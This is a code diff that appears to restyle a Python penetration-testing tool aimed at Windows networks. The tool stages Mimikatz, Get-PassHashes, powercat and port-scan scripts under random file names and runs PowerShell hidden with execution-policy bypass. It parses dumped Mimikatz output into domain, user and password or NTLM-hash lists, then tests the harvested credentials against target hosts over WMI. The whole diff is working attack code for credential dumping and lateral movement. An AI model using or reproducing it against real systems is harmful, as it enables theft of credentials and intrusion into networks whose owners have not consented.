@@ -55,30 +55,30 @@ aesKey=None
 k=False
 dc_ip=None
 mode='SHARE'
-share='C$'      
+share='C$'
 powershellArgs=' -NoP -NonI -W Hidden -ep bypass '
 
-tmpFilename1=binascii.b2a_hex(os.urandom(20))+".ps1" #Get-PassHashes.ps1
-tmpFilename2=binascii.b2a_hex(os.urandom(20))+".ps1" #Invoke-Mimikatz.ps1
-tmpFilename3=binascii.b2a_hex(os.urandom(20))+".ps1" #Invoke-Ping.ps1
-tmpFilename4=binascii.b2a_hex(os.urandom(20))+".ps1" #Invoke-Portscan.ps1
-tmpFilename5=binascii.b2a_hex(os.urandom(20))+".ps1" #powercat.ps1
-tmpFilename6=binascii.b2a_hex(os.urandom(20))+".ps1" #Start-WebServer.ps1
-web_dir = os.getcwd()+"/modules"
+tmpFilename1 = f"{binascii.b2a_hex(os.urandom(20))}.ps1"
+tmpFilename2 = f"{binascii.b2a_hex(os.urandom(20))}.ps1"
+tmpFilename3 = f"{binascii.b2a_hex(os.urandom(20))}.ps1"
+tmpFilename4 = f"{binascii.b2a_hex(os.urandom(20))}.ps1"
+tmpFilename5 = f"{binascii.b2a_hex(os.urandom(20))}.ps1"
+tmpFilename6 = f"{binascii.b2a_hex(os.urandom(20))}.ps1"
+web_dir = f"{os.getcwd()}/modules"
 orig_dir = os.getcwd()
 
-for f in glob.glob(web_dir+"/*.ps1"):
-    tmpFilename=f.replace(web_dir+"/","")
+for f in glob.glob(f"{web_dir}/*.ps1"):
+    tmpFilename = f.replace(f"{web_dir}/", "")
     tmpFilename=tmpFilename.replace(".ps1","")
     if len(tmpFilename)>19:
         os.remove(f)
 
-copyfile(web_dir+"/Get-PassHashes.ps1", web_dir+"/"+tmpFilename1)
-copyfile(web_dir+"/Invoke-Mimikatz.ps1", web_dir+"/"+tmpFilename2)
-copyfile(web_dir+"/Invoke-Ping.ps1", web_dir+"/"+tmpFilename3)
-copyfile(web_dir+"/Invoke-Portscan.ps1", web_dir+"/"+tmpFilename4)
-copyfile(web_dir+"/powercat.ps1", web_dir+"/"+tmpFilename5)
-copyfile(web_dir+"/start-WebServer.ps1", web_dir+"/"+tmpFilename6)
+copyfile(f"{web_dir}/Get-PassHashes.ps1", f"{web_dir}/{tmpFilename1}")
+copyfile(f"{web_dir}/Invoke-Mimikatz.ps1", f"{web_dir}/{tmpFilename2}")
+copyfile(f"{web_dir}/Invoke-Ping.ps1", f"{web_dir}/{tmpFilename3}")
+copyfile(f"{web_dir}/Invoke-Portscan.ps1", f"{web_dir}/{tmpFilename4}")
+copyfile(f"{web_dir}/powercat.ps1", f"{web_dir}/{tmpFilename5}")
+copyfile(f"{web_dir}/start-WebServer.ps1", f"{web_dir}/{tmpFilename6}")
 
 userPassList=[]
 compromisedHostList=[]
@@ -118,12 +118,12 @@ class relayThread(object):
         self.hopPoint2List=hopPoint2List
 
         threads=[]
-    	self.ip = ip
+        self.ip = ip
         self.targetIP = targetIP
-    	self.portNo = portNo
+        self.portNo = portNo
 
         #t = threading.Thread(target=self.runWebServer, args=())
-        threads = list()
+        threads = []
         t = threading.Thread(target=self.run, args=())
         threads.append(t)
         t1 = threading.Thread(target=self.runWebServer, args=())
@@ -170,8 +170,7 @@ class relayThread(object):
 
 
 def setColor(message, bold=True, color=None, onColor=None):
-    retVal = colored(message, color=color, on_color=onColor, attrs=("bold",))
-    return retVal
+    return colored(message, color=color, on_color=onColor, attrs=("bold",))
 
 def runCommand(args, cwd = None, shell = False, kill_tree = True, timeout = -1, env = None):
     class Alarm(Exception):
@@ -220,7 +219,7 @@ def parseMimikatzOutput(list1):
                 ntHash=(x.replace("* NTLM     :","")).strip()
                 if len(lmHash)<1:
                     lmHash='aad3b435b51404eeaad3b435b51404ee'
-                password1=lmHash+":"+ntHash
+                password1 = f"{lmHash}:{ntHash}"
             if "* Password :" in x:            
                 password1=x.replace("* Password :","")
             domain1=domain1.strip()
@@ -228,14 +227,21 @@ def parseMimikatzOutput(list1):
             password1=password1.strip()
             if len(username1)>1 and len(domain1)>1 and len(password1)>1: 
                 #if (domain1!="(null)" or username1!="(null)" or password1!="(null)"):
-                if domain1!="(null)":                    
-                    if not username1.endswith("$") and len(password1)<50:
-                        if "\\" in username1:
-                            domain1=username1.split("\\")[0]   
-                            username1=username1.split("\\")[1]   
-                        if len(password1)>0 and password1!='(null)':
-                            if [domain1,username1,password1] not in tmpPasswordList:
-                                tmpPasswordList.append([str(domain1),str(username1),str(password1)])
+                if (
+                    domain1 != "(null)"
+                    and not username1.endswith("$")
+                    and len(password1) < 50
+                ):
+                    if "\\" in username1:
+                        domain1=username1.split("\\")[0]   
+                        username1=username1.split("\\")[1]
+                    if (
+                        len(password1) > 0
+                        and password1 != '(null)'
+                        and [domain1, username1, password1]
+                        not in tmpPasswordList
+                    ):
+                        tmpPasswordList.append([str(domain1),str(username1),str(password1)])
                 username1=""
                 domain1=""
                 password1=""
@@ -340,13 +346,13 @@ def multi_threader_tcp():
 
 def testAccount(targetIP, domain, username, password, passwordHash):
     if username!="guest":
-        if domain==None or len(domain)<1:
+        if domain is None or len(domain) < 1:
             domain='WORKGROUP'
         cmd='whoami'
     complete=False
     results=''
     status=''
-    while complete==False:
+    while not complete:
         results,status=runWMIEXEC(targetIP, domain, username, password, passwordHash, cmd) 
         if "can't start new thread" not in str(status):
             complete=True
